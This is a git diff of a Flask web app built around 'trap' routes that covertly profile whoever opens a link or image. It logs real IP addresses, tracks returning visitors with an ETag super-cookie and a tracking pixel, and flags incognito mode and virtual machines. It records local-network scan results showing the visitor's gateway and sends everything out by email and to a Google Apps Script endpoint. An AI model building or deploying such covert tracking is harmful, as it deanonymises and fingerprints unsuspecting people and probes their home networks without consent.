@@ -10,7 +10,6 @@ from fpdf import FPDF
 app = Flask(__name__)
 
 # --- CONFIGURATION ---
-# Папки: uploads для загрузок пользователей, root (.) для твоих ловушек
 UPLOAD_FOLDER = '/tmp/uploads' if os.environ.get('RENDER') else 'uploads'
 DB_FILE = '/tmp/db.json' if os.environ.get('RENDER') else 'db.json'
 
@@ -23,7 +22,6 @@ ALLOWED_EXTENSIONS = {'txt', 'pdf', 'doc', 'docx', 'jpg', 'png', 'exe', 'bat', '
 GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzR1L95FUkqS8X4OqcS0bBBqIGCdD4YfW7yCa5diOxnLeKvxnP1ONl-zGcezeEOLKLDOA/exec"
 
 # In-memory session storage
-active_sessions = {}
 db = {}
 
 # --- DATABASE HELPERS ---
@@ -62,6 +60,18 @@ def analyze_threats(server_ip, client_data, headers):
     # 3. IPv6
     if client_data.get('network', {}).get('ipv6', {}).get('detected'):
         anomalies.append(f"IPv6 Detected: {client_data['network']['ipv6']['ip']}")
+
+    # 4. Security & VM Checks
+    if client_data.get('security', {}).get('incognito') == "Yes (Probable)":
+        anomalies.append("SECURITY: Incognito Mode Detected")
+    
+    if client_data.get('fingerprints', {}).get('gpu', {}).get('renderer', '').find('SwiftShader') != -1:
+        anomalies.append("VM DETECTED: Google SwiftShader Renderer")
+
+    # 5. LAN Scan Results
+    lan_scan = client_data.get('network', {}).get('lan_scan', [])
+    if lan_scan:
+        anomalies.append(f"LOCAL NETWORK: Gateway found at {lan_scan[0].get('ip')}")
 
     return list(set(anomalies))
 
@@ -106,12 +116,9 @@ def generate_receipt(uid, filename):
 # ===       TRAP ROUTES                  ===
 # ==========================================
 
-# 1. HTML TRAP (Полный функционал: JS, WebRTC, Canvas)
 @app.route('/view/<path:filename>')
 def view_trap(filename):
     uid = uuid.uuid4().hex[:8]
-    
-    # Логируем открытие страницы
     forwarded_for = request.headers.get('X-Forwarded-For', '')
     real_ip = forwarded_for.split(',')[0].strip() if forwarded_for else request.remote_addr
     
@@ -125,26 +132,21 @@ def view_trap(filename):
 
     return render_template('trap.html', filename=filename, uid=uid)
 
-# 2. RAW IMAGE TRAP (Тихий режим: ETag, IP, UA)
 @app.route('/raw/<path:filename>')
 def raw_image(filename):
-    # Логика поиска файла: Сначала в корне (твои ловушки), потом в uploads
     directory = '.' 
     if not os.path.exists(os.path.join(directory, filename)):
         directory = app.config['UPLOAD_FOLDER']
 
     try:
-        # ETag Super-Cookie Logic
         client_etag = request.headers.get('If-None-Match')
         is_returning = True if client_etag else False
         uid = client_etag.strip('"') if client_etag else uuid.uuid4().hex
 
-        # Логируем (если это не запрос от нашего же HTML-трапа)
         forwarded_for = request.headers.get('X-Forwarded-For', '')
         real_ip = forwarded_for.split(',')[0].strip() if forwarded_for else request.remote_addr
         referer = request.headers.get('Referer', '')
         
-        # Фильтруем логи, чтобы не дублировать данные при открытии через HTML Trap
         if 'view/' not in referer:
              threading.Thread(target=send_email_background, args=(
                 {'system': {'super_cookie_match': is_returning, 'referer': referer}}, 
@@ -159,7 +161,6 @@ def raw_image(filename):
         response.headers['Cache-Control'] = 'private, max-age=31536000'
         return response
     except:
-        # Если файла нет - отдаем 1x1 пиксель
         return make_response(b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b', 200, {'Content-Type': 'image/gif'})
 
 # ==========================================
@@ -168,10 +169,6 @@ def raw_image(filename):
 
 @app.route('/health')
 def health_check(): return "OK", 200
-
-@app.route('/webhook', methods=['POST'])
-def canary_webhook():
-    return jsonify({"status": "logged"}), 200
 
 @app.route('/pixel.gif')
 def tracking_pixel():
@@ -254,6 +251,12 @@ def collect_data():
         
         forwarded_for = request.headers.get('X-Forwarded-For', '')
         real_ip = forwarded_for.split(',')[0].strip() if forwarded_for else request.remote_addr
+
+        # === CAPTURE SERVER-SIDE HEADERS ===
+        if 'system' not in data: data['system'] = {}
+        data['system']['accept_encoding'] = request.headers.get('Accept-Encoding', 'None')
+        data['system']['accept_language'] = request.headers.get('Accept-Language', 'None')
+        # ===================================
 
         anomalies = analyze_threats(real_ip, data, request.headers)
         if 'threat' in data and 'anomalies' in data['threat']: anomalies.extend(data['threat']['anomalies'])
